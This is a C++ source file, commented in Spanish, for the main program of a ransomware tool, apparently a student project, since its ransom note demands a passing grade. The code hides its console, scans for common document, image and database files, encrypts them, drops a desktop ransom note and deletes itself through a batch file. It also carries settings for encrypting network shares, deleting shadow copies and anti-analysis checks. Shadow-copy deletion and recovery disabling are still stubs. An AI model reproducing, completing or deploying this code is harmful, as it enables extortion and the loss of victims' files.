//Sistema
#ifdef PLATFORM_WINDOWS
#include <windows.h>
#include <shlobj.h>
#elif PLATFORM_UNIX
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#endif
#include <iostream>
#include <string>
//Local 
#include "core/encryption.h"
#include "core/file_scanner.h"
#include "evasion/anti_analysis.h"
#include "utils/logger.h"
#include "utils/file_utils.h"

#ifdef PLATFORM_WINDOWS
//bibliotecas enlazadas
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#endif
// Declaración de funciones
void CreateRansomNotes();
void ChangeWallpaper();
void DisableSystemRecovery();
void DeleteShadowCopies();
// Configuración global
struct RansomConfig {
    std::vector<std::string> targetExtensions = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".rtf", ".csv", ".jpg", ".jpeg",
        ".png", ".gif", ".bmp", ".mp4", ".avi", ".mov",
        ".zip", ".rar", ".7z", ".tar", ".sql", ".mdb",
        ".db", ".dbf", ".sqlite", ".psd", ".ai", ".svg"
    };
    
    std::string ransomNote = "Tus archivos fueron encritados\n\n"
                             "Para recuperar tus archivos:\n"
                             "1. Envía un 10 de calificacion a: Emanuel Neri Quezada\n"
                             "2. Recibe la clave de descifrado\n\n"
                             "ADVERTENCIA: No intentes descifrar los archivos tú mismo\n"
                             "No te arriesgues a perder todo";
    
    std::string wallpaperPath = "%TEMP%\\ransom_wallpaper.bmp";
    std::string logPath = "%APPDATA%\\SystemCache\\ransom.log";
    
    bool encryptNetworkShares = true;
    bool deleteShadowCopies = true;
    bool disableRecovery = true;
    
    int maxThreads = 4;
    int chunkSize = 1048576; // 1MB chunks
};
// Variables globales
RansomConfig g_config;
Logger* g_logger = nullptr;
EncryptionEngine* g_encryption = nullptr;
FileScanner* g_scanner = nullptr;
AntiAnalysis* g_antiAnalysis = nullptr;
// Función del flujo principal
bool InitializeComponents();
bool PerformSecurityChecks();
void ExecuteRansomware();
void CleanupAndExit();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Ocultar ventana de consola
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    
    // Inicializar registro de logs
    g_logger = new Logger(g_config.logPath);
    g_logger->Log("El ransomware ha iniciado");
    
    // Realizar verificaciones de seguridad
    if (!PerformSecurityChecks()) {
        g_logger->Log("Las verificaciones de seguridad fallaron, saliendo");
        CleanupAndExit();
        return 0;
    }
    
    // Inicializar componentes
    if (!InitializeComponents()) {
        g_logger->Log("Failed to initialize components");
        CleanupAndExit();
        return 0;
    }
    
    // Ejecutar lógica principal del ransomware
    ExecuteRansomware();
    
    // Limpiar y salir
    CleanupAndExit();
    return 0;
}
bool InitializeComponents() {
    try {
        // Inicializar motor de encriptación
        g_encryption = new EncryptionEngine();
        if (!g_encryption->Initialize()) {
            g_logger->Log("Failed to initialize encryption engine");
            return false;
        }
        
        // Inicializar escáner de archivos
        g_scanner = new FileScanner();
        g_scanner->SetTargetExtensions(g_config.targetExtensions.data(), g_config.targetExtensions.size());
        
        // Inicializar anti-análisis
        g_antiAnalysis = new AntiAnalysis();
        g_antiAnalysis->EnableAllChecks();
        
        g_logger->Log("All components initialized successfully");
        return true;
    }
    catch (const std::exception& e) {
        g_logger->Log("Exception during initialization: " + std::string(e.what()));
        return false;
    }
}
bool PerformSecurityChecks() {
    // [VM TEST MODE] Todos los checks desactivados temporalmente.
    // El codigo original esta en src/security_checks_full.cpp.bak
    g_logger->Log("Security checks bypassed (VM test mode)");
    return true;
}
void ExecuteRansomware() {
    g_logger->Log("Starting ransomware execution");
    
    try {
        // Paso 1: Generar claves de encriptación
        g_logger->Log("Generating encryption keys");
        std::string publicKey = g_encryption->GenerateKeyPair();

        // Paso 1b: Persistir clave privada localmente (DPAPI + %APPDATA% / registro)
        if (g_encryption->SaveProtectedPrivateKey()) {
            g_logger->Log("Private key persisted (DPAPI-protected)");
        } else {
            g_logger->Log("WARNING: Could not persist private key");
        }

        // Paso 2: Escanear archivos objetivo
        g_logger->Log("Scanning for target files");
        std::vector<std::string> targetFiles = g_scanner->ScanSystem();
        g_logger->Log("Found " + std::to_string(targetFiles.size()) + " target files");
        
        // Paso 3: Encriptar archivos
        g_logger->Log("Starting file encryption");
        int encryptedCount = 0;
        
        for (const auto& file : targetFiles) {
            if (g_encryption->EncryptFile(file, publicKey)) {
                encryptedCount++;
                
                // Actualizar progreso cada 100 archivos
                if (encryptedCount % 100 == 0) {
                    g_logger->Log("Encrypted " + std::to_string(encryptedCount) + " files");
                }
            }
        }
        
        g_logger->Log("Encryption complete. Total files encrypted: " + std::to_string(encryptedCount));
        
        // Paso 4: Crear notas de rescate
        g_logger->Log("Creating ransom notes");
        CreateRansomNotes();
        
        // Paso 5: Cambiar fondo de pantalla
        g_logger->Log("Changing wallpaper");
        ChangeWallpaper();
        
        // Paso 6: Desactivar opciones de recuperación
        if (g_config.disableRecovery) {
            g_logger->Log("Disabling recovery options");
            DisableSystemRecovery();
        }
        
        // Paso 7: Eliminar copias shadow
        if (g_config.deleteShadowCopies) {
            g_logger->Log("Deleting shadow copies");
            DeleteShadowCopies();
        }
        
        g_logger->Log("Ransomware execution completed successfully");
    }
    catch (const std::exception& e) {
        g_logger->Log("Exception during execution: " + std::string(e.what()));
    }
}
void CreateRansomNotes() {
    // Crear nota de rescate en cada escritorio de usuario
    char desktopPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
        std::string notePath = std::string(desktopPath) + "\\README_FILES_ENCRYPTED.txt";
        
        if (FileUtils::WriteStringToFile(notePath, g_config.ransomNote)) {
            g_logger->Log("Created ransom note: " + notePath);
        }
    }
    
    // Crear nota de rescate en cada directorio con archivos encriptados
    // Esto escanearía y crearía notas en los directorios relevantes
}
void ChangeWallpaper() {
    // Esto implementaría la funcionalidad de cambio de fondo de pantalla
    // Por ahora, solo log la acción
    g_logger->Log("Wallpaper change functionality to be implemented");
}
void DisableSystemRecovery() {
    // Esto implementaría la desactivación de system recovery
    // Por ahora, solo log la acción
    g_logger->Log("System recovery disable functionality to be implemented");
}
void DeleteShadowCopies() {
    // Esto implementaría la eliminación de shadow copies usando vssadmin
    // Por ahora, solo log la acción
    g_logger->Log("Shadow copy deletion functionality to be implemented");
}
void CleanupAndExit() {
    g_logger->Log("Performing cleanup");
    
    // Limpiar objetos globales
    if (g_logger) delete g_logger;
    if (g_encryption) delete g_encryption;
    if (g_scanner) delete g_scanner;
    if (g_antiAnalysis) delete g_antiAnalysis;
    
    // Autoeliminarse después de la ejecución
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    // Crear batch file para eliminar ejecutable
    std::string batchPath = std::string(selfPath) + ".bat";
    std::string batchContent = "@echo off\n";
    batchContent += "ping 127.0.0.1 -n 2 > nul\n";
    batchContent += "del \"" + std::string(selfPath) + "\"\n";
    batchContent += "del \"" + batchPath + "\"\n";
    
    if (FileUtils::WriteStringToFile(batchPath, batchContent)) {
        // Ejecutar batch file y salir
        ShellExecuteA(NULL, "open", batchPath.c_str(), NULL, NULL, SW_HIDE);
    }
}
